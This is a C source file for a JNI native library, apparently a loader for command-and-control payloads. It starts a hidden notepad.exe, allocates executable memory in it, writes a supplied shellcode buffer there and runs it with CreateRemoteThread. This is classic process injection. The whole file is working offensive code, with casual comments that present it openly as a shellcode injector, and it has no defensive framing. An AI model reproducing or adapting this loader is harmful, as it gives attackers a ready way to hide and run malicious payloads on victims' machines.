#include <stdlib.h>
#include <stdio.h>
#include <injector.h>


JNIEXPORT void JNICALL Java_LibC2Loader_inject(JNIEnv * env, jobject object, jbyteArray jdata) {
   jbyte * data = (*env)->GetByteArrayElements(env, jdata, 0);
   jsize length = (*env)->GetArrayLength(env, jdata);
   inject((LPCVOID)data, (SIZE_T)length);
   (*env)->ReleaseByteArrayElements(env, jdata, data, 0);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(LPCVOID buffer, int length) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hProcess   = NULL;
    SIZE_T wrote;
    LPVOID ptr;
    char lbuffer[1024];
    char cmdbuff[1024];

    /* reset some stuff */
    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    /* start a process */
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = NULL;
    si.hStdError = NULL;
    si.hStdInput = NULL;

    /* resolve windir? */
    GetEnvironmentVariableA("windir", lbuffer, 1024);

    /* setup our path... choose wisely for 32bit and 64bit platforms */
    #ifdef _IS64_
        _snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer);
    #else
        _snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);
    #endif

    /* spawn the process, baby! */
    if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
        return;

    hProcess = pi.hProcess;
    if( !hProcess )
        return;

    /* allocate memory in our process */
    ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    /* write our shellcode to the process */
    WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&wrote);
    if (wrote != length)
        return;

    /* create a thread in the process */
    CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
}


